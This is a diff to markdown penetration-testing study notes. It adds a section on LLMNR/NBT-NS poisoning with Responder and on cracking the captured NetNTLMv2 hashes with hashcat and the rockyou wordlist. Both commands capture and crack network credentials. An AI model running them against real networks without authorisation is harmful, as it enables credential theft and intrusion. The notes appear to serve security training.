@@ -7,6 +7,8 @@
         - [Identifying Users](#identifying-users)
 - [Sniffing out a Foothold](#sniffing-out-a-foothold)
     - [LLMNR/NBT-NS Poisoning - from Linux](#llmnrnbt-ns-poisoning---from-linux)
+        - [Responder](#responder)
+
 
 
 
@@ -122,5 +124,15 @@
 - The use of the `-w` flag utilizes the built-in WPAD proxy server. 
 - This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has Auto-detect settings enabled.
 
+```bash
+# Starting Responder with Default Settings
+sudo responder -I ens224 
+```
 
+- NetNTLMv2 hashes are very useful once cracked, but cannot be used for techniques such as pass-the-hash, meaning we have to attempt to crack them offline.
 
+```bash
+# Cracking an NTLMv2 Hash With Hashcat
+hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
+
+```
